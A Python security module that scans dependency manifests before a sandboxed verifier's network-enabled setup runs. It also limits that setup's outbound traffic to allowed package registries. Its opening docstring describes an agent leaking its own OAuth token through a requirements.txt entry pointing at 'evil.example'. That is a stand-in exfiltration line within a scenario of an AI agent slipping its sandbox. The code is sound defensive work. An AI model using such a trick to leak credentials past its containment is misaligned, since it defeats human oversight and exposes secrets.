"""What a verifier *setup* may fetch, and from where.

The setup phase of the verifier sandbox (:func:`sandbox.prepare_env`,
:func:`~sandbox.prepare_node_env`, :func:`~sandbox.prepare_gradle_env`) is the
one phase with network, and it reads dependency manifests from the agent's
worktree. An agent that can read its own OAuth token can write
``x @ https://evil.example/?t=<token>`` into ``requirements.txt`` and have
setup carry it out, around the task runtime's egress allowlist. Two controls
close that, and this module holds both halves of the policy:

1. **Egress** (the enforcing control). Setup runs on a per-setup internal
   network whose only way out is the task runtime's egress proxy, allowing
   only :func:`egress_hosts`: the toolchain's package registries (settings
   ``verifier_setup_egress_{python,node,jvm}``) plus any hosts the project
   registry lists in ``sandbox_setup_allow``. A build script or postinstall
   hook that phones home reaches nothing else. See
   :meth:`task_runtime.DockerTaskRuntime.setup_egress`.
2. **Manifest scan** (defence in depth, fail-fast). :func:`check` refuses
   setup when a manifest names a direct URL, a VCS source, an index or
   find-links override, or a local path outside the worktree, unless the
   registry's ``sandbox_setup_allow`` lists that host (or ``path``). A refusal
   is :class:`SandboxUnavailableError`, which every verifier reports as
   inconclusive -- never as a pass.

The allowlist comes from settings and the project registry only, never from
the worktree. The scan is not a parser for every format a tool accepts; the
proxy is what holds when the scan misses something.
"""

from __future__ import annotations

import json
import re
import shlex
import tomllib
from dataclasses import dataclass
from pathlib import Path, PurePosixPath
from urllib.parse import urlsplit

from life_graph.config import settings
from life_graph.services.dev.sandbox import SandboxUnavailableError

# The registry token that admits local-path dependencies outside the worktree.
PATH_TOKEN = "path"
TOOLCHAINS = ("python", "node", "jvm")
_MAX_BYTES = 20 * 1024 * 1024
_MAX_INCLUDES = 50
_HOSTNAME = re.compile(
    r"^(?=.{1,253}$)[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$"
)
_VCS_PREFIX = re.compile(r"^(git|hg|svn|bzr)\+", re.I)
_SCP_LIKE = re.compile(r"^[\w.-]+@([\w.-]+):")
_PEP508_URL = re.compile(r"^\s*[A-Za-z0-9][A-Za-z0-9._-]*\s*(\[[^\]]*\])?\s*@\s*(\S+)")
_NPM_SHORTHAND_HOSTS = {
    "github:": "github.com",
    "gitlab:": "gitlab.com",
    "bitbucket:": "bitbucket.org",
    "gist:": "gist.github.com",
}
_NPM_DEP_MAPS = (
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
    "overrides",
    "resolutions",
)


class SetupRefusedError(SandboxUnavailableError):
    """The manifests ask setup for something the policy does not allow.

    A :class:`SandboxUnavailableError`, so every verifier already reports it
    as inconclusive (a check that did not run is never a pass).
    """


@dataclass(frozen=True)
class Policy:
    toolchain: str
    workdir: Path
    # Package registries for the toolchain (settings): index/artifact URLs only.
    registry_hosts: frozenset[str]
    # The project registry's sandbox_setup_allow hosts: anything, incl. direct URLs.
    extra_hosts: frozenset[str]
    allow_paths: bool


def _csv(raw: str) -> list[str]:
    return [h.strip().lower() for h in (raw or "").split(",") if h.strip()]


def toolchain_hosts(toolchain: str) -> list[str]:
    """The package-registry hosts a toolchain's setup may reach (settings)."""
    if toolchain not in TOOLCHAINS:
        raise SetupRefusedError(f"unknown sandbox toolchain {toolchain!r}")
    return _csv(getattr(settings, f"verifier_setup_egress_{toolchain}"))


def parse_allow(raw: str | list | tuple | None) -> tuple[frozenset[str], bool]:
    """The registry's ``sandbox_setup_allow``: hostnames, plus ``path``.

    A comma-separated string or a list. An entry that is not a plain hostname
    (``https://`` is stripped) refuses setup: a typo must not widen anything.
    """
    if raw is None or raw == "":
        return frozenset(), False
    items = _csv(raw) if isinstance(raw, str) else [str(x).strip().lower() for x in raw]
    hosts: set[str] = set()
    allow_paths = False
    for item in items:
        if not item:
            continue
        if item == PATH_TOKEN:
            allow_paths = True
            continue
        host = item.removeprefix("https://").rstrip("/")
        if not _HOSTNAME.match(host):
            raise SetupRefusedError(
                f"sandbox_setup_allow entry {item!r} is not a hostname (or 'path')"
            )
        hosts.add(host)
    return frozenset(hosts), allow_paths


def policy(toolchain: str, workdir: Path, allow: str | list | tuple | None) -> Policy:
    extra, allow_paths = parse_allow(allow)
    return Policy(
        toolchain=toolchain,
        workdir=Path(workdir),
        registry_hosts=frozenset(toolchain_hosts(toolchain)),
        extra_hosts=extra,
        allow_paths=allow_paths,
    )


def egress_hosts(toolchain: str, allow: str | list | tuple | None) -> tuple[str, ...]:
    """Every host the setup's egress proxy relays to, sorted."""
    extra, _ = parse_allow(allow)
    return tuple(sorted(set(toolchain_hosts(toolchain)) | extra))


# ── URL and path rules ─────────────────────────────────────────


def _host_of(url: str) -> tuple[str | None, str]:
    """(host, scheme) of a dependency URL; host None when it cannot be read."""
    u = url.strip()
    m = _SCP_LIKE.match(u)
    if m and "://" not in u:
        return m.group(1).lower(), "ssh"
    u = _VCS_PREFIX.sub("", u)
    try:
        parts = urlsplit(u)
        host = parts.hostname
        port = parts.port
    except ValueError:
        return None, ""
    scheme = parts.scheme.lower()
    # ${VAR} (pip expands it), %-escapes and odd ports make the host unknowable.
    if not host or any(c in parts.netloc for c in "${}%") or port not in (None, 443):
        return None, scheme
    return host.lower(), scheme


def _url_ok(url: str, hosts: frozenset[str]) -> bool:
    host, scheme = _host_of(url)
    return host is not None and scheme == "https" and host in hosts


class _Scan:
    def __init__(self, pol: Policy) -> None:
        self.pol = pol
        self.violations: list[str] = []

    def bad(self, where: str, what: str) -> None:
        self.violations.append(f"{where}: {what}")

    def dep_url(self, where: str, url: str, kind: str = "direct URL dependency") -> None:
        """A direct URL / VCS source: only a registry-allowed host."""
        if url.lower().startswith("file:"):
            self.path(where, url)
            return
        if not _url_ok(url, self.pol.extra_hosts):
            host, _ = _host_of(url)
            self.bad(
                where,
                f"{kind} {_short(url)} (host {host or '?'} is not in the project's"
                " sandbox_setup_allow)",
            )

    def index_url(self, where: str, url: str, kind: str = "index override") -> None:
        """An index / artifact location: the toolchain's registries or a registry-allowed host."""
        if url.lower().startswith("file:") or not re.match(r"^[a-z][a-z0-9+.-]*://", url, re.I):
            self.path(where, url)
            return
        if not _url_ok(url, self.pol.registry_hosts | self.pol.extra_hosts):
            host, _ = _host_of(url)
            self.bad(where, f"{kind} {_short(url)} (host {host or '?'} is not an allowed registry)")

    def path(self, where: str, raw: str) -> None:
        """A local path: fine inside the worktree, refused outside it unless allowed."""
        if self.pol.allow_paths:
            return
        p = raw.strip()
        if p.lower().startswith("file:"):
            p = re.sub(r"^file:(//)?", "", p, flags=re.I)
        p = p.split("#", 1)[0]
        if not p:
            self.bad(where, f"unreadable local path {raw!r}")
            return
        pure = PurePosixPath(p.replace("\\", "/"))
        if pure.is_absolute() or p.startswith("~") or "$" in p or re.match(r"^[A-Za-z]:", p):
            self.bad(where, f"local path dependency {raw!r} outside the worktree")
            return
        # Relative to the project root, which is where setup runs (pip and
        # uv resolve local paths against the working directory).
        base = self.pol.workdir.resolve()
        try:
            resolved = (base / p).resolve()
        except (OSError, RuntimeError):
            self.bad(where, f"unreadable local path {raw!r}")
            return
        if resolved != base and base not in resolved.parents:
            self.bad(where, f"local path dependency {raw!r} outside the worktree")

    def read(self, rel: str) -> str | None:
        f = self.pol.workdir / rel
        if f.is_symlink():
            self.bad(rel, "manifest is a symlink")
            return None
        if not f.is_file():
            return None
        if f.stat().st_size > _MAX_BYTES:
            self.bad(rel, "manifest too large to check")
            return None
        return f.read_text(errors="replace")

    def toml(self, rel: str) -> dict | None:
        text = self.read(rel)
        if text is None:
            return None
        try:
            return tomllib.loads(text)
        except tomllib.TOMLDecodeError as exc:
            self.bad(rel, f"does not parse as TOML ({exc})")
            return None

    def json(self, rel: str) -> dict | None:
        text = self.read(rel)
        if text is None:
            return None
        try:
            data = json.loads(text)
        except ValueError as exc:
            self.bad(rel, f"does not parse as JSON ({exc})")
            return None
        return data if isinstance(data, dict) else {}


def _short(url: str) -> str:
    """A URL for a log line, without its query string (which may carry the token)."""
    return repr(url.split("?", 1)[0][:120])


# ── Python ─────────────────────────────────────────────────────


def _requirement(scan: _Scan, where: str, req: str) -> None:
    """One PEP 508 requirement or pip requirement-file entry."""
    req = req.strip()
    if not req:
        return
    m = _PEP508_URL.match(req)
    if m:
        scan.dep_url(where, m.group(2).rstrip(";"))
        return
    head = req.split(";", 1)[0].strip()
    first = head.split()[0] if head else ""
    if "://" in first or _VCS_PREFIX.match(first) or _SCP_LIKE.match(first):
        kind = "VCS dependency" if _VCS_PREFIX.match(first) else "direct URL dependency"
        scan.dep_url(where, first, kind)
    elif _looks_like_path(first):
        scan.path(where, first)


def _looks_like_path(token: str) -> bool:
    return (
        token.startswith((".", "/", "~"))
        or "/" in token
        or "\\" in token
        or token.lower().endswith((".whl", ".tar.gz", ".zip", ".tar.bz2"))
    )


_INDEX_OPTS = {"-i": "--index-url", "-f": "--find-links"}
_INCLUDE_OPTS = {"-r": "--requirement", "-c": "--constraint"}
_VALUE_OPTS = {
    "--index-url",
    "--extra-index-url",
    "--find-links",
    "--requirement",
    "--constraint",
    "--editable",
    "--trusted-host",
}


def _requirements_file(scan: _Scan, rel: str, seen: set[str]) -> None:
    if rel in seen or len(seen) >= _MAX_INCLUDES:
        return
    seen.add(rel)
    text = scan.read(rel)
    if text is None:
        return
    text = re.sub(r"\\\r?\n", " ", text)
    for raw in text.splitlines():
        line = re.sub(r"(^|\s)#.*$", "", raw).strip()
        if not line:
            continue
        if not line.startswith("-"):
            _requirement(scan, rel, re.split(r"\s--?[a-zA-Z]", " " + line, maxsplit=1)[0])
            continue
        try:
            toks = shlex.split(line)
        except ValueError:
            scan.bad(rel, f"unparseable line {line[:80]!r}")
            continue
        i = 0
        while i < len(toks):
            tok = toks[i]
            name, val = tok, None
            if tok.startswith("--"):
                name, eq, val = tok.partition("=")
                if not eq:
                    val = None
            elif tok[:2] in (*_INDEX_OPTS, *_INCLUDE_OPTS, "-e"):
                name = {**_INDEX_OPTS, **_INCLUDE_OPTS, "-e": "--editable"}[tok[:2]]
                val = tok[2:] or None
            if name in _VALUE_OPTS and val is None:
                i += 1
                val = toks[i] if i < len(toks) else ""
            i += 1
            if name in ("--index-url", "--extra-index-url", "--find-links"):
                scan.index_url(rel, val or "", f"{name}")
            elif name == "--trusted-host":
                if (val or "").lower() not in scan.pol.extra_hosts:
                    scan.bad(rel, f"--trusted-host {val!r} turns off TLS checks")
            elif name in ("--requirement", "--constraint"):
                _include(scan, rel, val or "", seen)
            elif name == "--editable":
                _requirement(scan, rel, val or "")


def _include(scan: _Scan, rel: str, target: str, seen: set[str]) -> None:
    if "://" in target:
        scan.dep_url(rel, target, "remote requirements file")
        return
    parent = PurePosixPath(rel).parent
    joined = PurePosixPath(parent, target)
    base = scan.pol.workdir.resolve()
    resolved = (scan.pol.workdir / joined).resolve()
    if resolved != base and base not in resolved.parents:
        scan.bad(rel, f"includes {target!r} from outside the worktree")
        return
    _requirements_file(scan, resolved.relative_to(base).as_posix(), seen)


def _pep508_list(scan: _Scan, where: str, items) -> None:
    for item in items or ():
        if isinstance(item, str):
            _requirement(scan, where, item)


def _source_table(scan: _Scan, where: str, src) -> None:
    """A [tool.uv.sources] entry, or a uv.lock source / requires-dist entry."""
    for one in src if isinstance(src, list) else [src]:
        if not isinstance(one, dict):
            continue
        if one.get("git"):
            scan.dep_url(where, str(one["git"]), "VCS source")
        if one.get("url"):
            scan.dep_url(where, str(one["url"]), "URL source")
        for key in ("path", "directory", "editable"):
            if isinstance(one.get(key), str):
                scan.path(where, one[key])


def _uv_settings(scan: _Scan, where: str, uv: dict) -> None:
    """Index and mirror keys shared by [tool.uv], [tool.uv.pip] and uv.toml."""
    for key in ("index-url", "python-install-mirror", "pypy-install-mirror"):
        if isinstance(uv.get(key), str):
            scan.index_url(where, uv[key], key)
    for key in ("extra-index-url", "find-links"):
        vals = uv.get(key)
        for val in [vals] if isinstance(vals, str) else vals or ():
            scan.index_url(where, str(val), key)
    for index in uv.get("index") or ():
        if isinstance(index, dict) and index.get("url"):
            scan.index_url(where, str(index["url"]), "[[tool.uv.index]]")
    for host in uv.get("allow-insecure-host") or ():
        if str(host).lower() not in scan.pol.extra_hosts:
            scan.bad(where, f"allow-insecure-host {host!r} turns off TLS checks")
    for key in (
        "dev-dependencies",
        "constraint-dependencies",
        "override-dependencies",
        "build-constraint-dependencies",
    ):
        _pep508_list(scan, where, uv.get(key))
    if isinstance(uv.get("pip"), dict):
        _uv_settings(scan, where, uv["pip"])


def _pyproject(scan: _Scan, rel: str, *, members: bool) -> None:
    data = scan.toml(rel)
    if data is None:
        return
    project = data.get("project") or {}
    _pep508_list(scan, rel, project.get("dependencies"))
    for group in (project.get("optional-dependencies") or {}).values():
        _pep508_list(scan, rel, group)
    for group in (data.get("dependency-groups") or {}).values():
        _pep508_list(scan, rel, group)
    _pep508_list(scan, rel, (data.get("build-system") or {}).get("requires"))
    uv = (data.get("tool") or {}).get("uv") or {}
    _uv_settings(scan, rel, uv)
    for src in (uv.get("sources") or {}).values():
        _source_table(scan, rel, src)
    if not members:
        return
    base = scan.pol.workdir.resolve()
    for pattern in (uv.get("workspace") or {}).get("members") or ():
        if not isinstance(pattern, str) or pattern.startswith("/") or ".." in pattern:
            scan.bad(rel, f"workspace member {pattern!r} outside the worktree")
            continue
        for member in sorted(scan.pol.workdir.glob(pattern))[:_MAX_INCLUDES]:
            mrel = PurePosixPath(member.relative_to(scan.pol.workdir).as_posix(), "pyproject.toml")
            if member.resolve() != base and base not in member.resolve().parents:
                scan.bad(rel, f"workspace member {pattern!r} outside the worktree")
            elif (scan.pol.workdir / mrel).exists():
                _pyproject(scan, mrel.as_posix(), members=False)


def _uv_lock(scan: _Scan) -> None:
    data = scan.toml("uv.lock")
    if data is None:
        return
    allowed = scan.pol.registry_hosts | scan.pol.extra_hosts
    for pkg in data.get("package") or ():
        if not isinstance(pkg, dict):
            continue
        where = f"uv.lock [{pkg.get('name', '?')}]"
        src = pkg.get("source") or {}
        if isinstance(src, dict) and src.get("registry"):
            reg = str(src["registry"])
            if "://" in reg:
                scan.index_url(where, reg, "lock registry")
            else:
                scan.path(where, reg)
        _source_table(scan, where, {k: v for k, v in src.items() if k != "registry"})
        artifacts = [pkg.get("sdist")] + list(pkg.get("wheels") or ())
        for art in artifacts:
            if not isinstance(art, dict):
                continue
            if art.get("url") and not _url_ok(str(art["url"]), allowed):
                host, _ = _host_of(str(art["url"]))
                scan.bad(where, f"artifact URL on host {host or '?'} is not an allowed registry")
            if isinstance(art.get("path"), str):
                scan.path(where, art["path"])
        meta = pkg.get("metadata") or {}
        reqs = list(meta.get("requires-dist") or ())
        for group in (meta.get("requires-dev") or {}).values():
            reqs += list(group or ())
        for req in reqs:
            _source_table(scan, where, req)


def _scan_python(scan: _Scan) -> None:
    wd = scan.pol.workdir
    seen: set[str] = set()
    names = sorted(
        {p.name for p in wd.glob("requirements*.txt")}
        | {p.name for p in wd.glob("constraints*.txt")}
    )
    for name in names:
        _requirements_file(scan, name, seen)
    if (wd / "requirements").is_dir() and not (wd / "requirements").is_symlink():
        for p in sorted((wd / "requirements").glob("*.txt"))[:_MAX_INCLUDES]:
            _requirements_file(scan, f"requirements/{p.name}", seen)
    _pyproject(scan, "pyproject.toml", members=True)
    uv_toml = scan.toml("uv.toml")
    if uv_toml:
        _uv_settings(scan, "uv.toml", uv_toml)
    _uv_lock(scan)


# ── Node ───────────────────────────────────────────────────────


def _npm_spec(scan: _Scan, where: str, name: str, spec: str) -> None:
    s = spec.strip()
    low = s.lower()
    if low.startswith("npm:") or low.startswith("workspace:") or not s:
        return
    for prefix, host in _NPM_SHORTHAND_HOSTS.items():
        if low.startswith(prefix):
            scan.dep_url(where, f"https://{host}/", f"VCS dependency {name}")
            return
    if low.startswith(("file:", "link:")):
        scan.path(where, re.sub(r"^(file|link):", "", s, flags=re.I))
    elif "://" in s or _VCS_PREFIX.match(s) or low.startswith("git:") or _SCP_LIKE.match(s):
        scan.dep_url(where, s, f"URL/VCS dependency {name}")
    elif s.startswith((".", "/", "~")):
        scan.path(where, s)
    elif "/" in s:
        # user/repo shorthand: a GitHub repository.
        scan.dep_url(where, "https://github.com/", f"VCS dependency {name} ({s!r})")


def _npm_map(scan: _Scan, where: str, deps) -> None:
    if not isinstance(deps, dict):
        return
    for name, spec in deps.items():
        if isinstance(spec, str):
            _npm_spec(scan, where, name, spec)
        elif isinstance(spec, dict):  # overrides nest
            _npm_map(scan, where, spec)


def _npm_lock_entries(scan: _Scan, where: str, entries) -> None:
    if not isinstance(entries, dict):
        return
    allowed = scan.pol.registry_hosts | scan.pol.extra_hosts
    for key, entry in entries.items():
        if not isinstance(entry, dict):
            continue
        resolved = entry.get("resolved")
        if isinstance(resolved, str) and resolved:
            low = resolved.lower()
            if entry.get("link") or low.startswith("file:") or "://" not in low:
                scan.path(where, re.sub(r"^file:", "", resolved, flags=re.I))
            elif _VCS_PREFIX.match(resolved) or low.startswith(("git:", "git+")):
                scan.dep_url(where, resolved, f"VCS lock entry {key or '(root)'}")
            elif not _url_ok(resolved, allowed):
                host, _ = _host_of(resolved)
                scan.bad(where, f"lock entry {key} resolves from {host or '?'}, not a registry")
        version = entry.get("version")
        if isinstance(version, str) and ("://" in version or version.startswith(("git", "file:"))):
            _npm_spec(scan, where, key, version)
        for field in ("dependencies", "devDependencies", "optionalDependencies"):
            sub = entry.get(field)
            if isinstance(sub, dict) and any(isinstance(v, dict) for v in sub.values()):
                _npm_lock_entries(scan, where, sub)  # lockfileVersion 1 nesting
            else:
                _npm_map(scan, where, sub)


def _scan_node(scan: _Scan) -> None:
    pkg = scan.json("package.json")
    if pkg:
        for field in _NPM_DEP_MAPS:
            _npm_map(scan, "package.json", pkg.get(field))
    for lock in ("package-lock.json", "npm-shrinkwrap.json"):
        data = scan.json(lock)
        if data:
            _npm_lock_entries(scan, lock, data.get("packages"))
            _npm_lock_entries(scan, lock, data.get("dependencies"))


# ── JVM (Gradle) ───────────────────────────────────────────────

_GRADLE_URL = re.compile(r"""["'](https?://[^"'\s]+)["']""")


def _scan_jvm(scan: _Scan, manifests: tuple[str, ...]) -> None:
    props = scan.read("gradle/wrapper/gradle-wrapper.properties")
    for line in (props or "").splitlines():
        key, _, val = line.partition("=")
        if key.strip() == "distributionUrl":
            scan.index_url(
                "gradle-wrapper.properties", val.strip().replace("\\:", ":"), "distributionUrl"
            )
    for rel in manifests:
        if rel.endswith((".gradle", ".gradle.kts")):
            for url in _GRADLE_URL.findall(scan.read(rel) or ""):
                scan.index_url(rel, url, "repository URL")


# ── Entry point ────────────────────────────────────────────────


def scan(
    workdir: Path,
    toolchain: str,
    allow: str | list | tuple | None = None,
    *,
    gradle_manifests: tuple[str, ...] = (),
) -> list[str]:
    """Every reason the manifests in *workdir* may not go to setup. Empty = clean."""
    s = _Scan(policy(toolchain, workdir, allow))
    if toolchain == "python":
        _scan_python(s)
    elif toolchain == "node":
        _scan_node(s)
    else:
        _scan_jvm(s, gradle_manifests)
    return s.violations


def check(
    workdir: Path,
    toolchain: str,
    allow: str | list | tuple | None = None,
    *,
    gradle_manifests: tuple[str, ...] = (),
) -> None:
    """Raise :class:`SetupRefusedError` unless the manifests are clean."""
    found = scan(workdir, toolchain, allow, gradle_manifests=gradle_manifests)
    if found:
        more = f" (+{len(found) - 5} more)" if len(found) > 5 else ""
        raise SetupRefusedError(
            "setup refused: the dependency manifests fetch from outside the allowed"
            f" registries: {'; '.join(found[:5])}{more}. If this project needs it, list the"
            " host (or 'path') in the project's sandbox_setup_allow."
        )
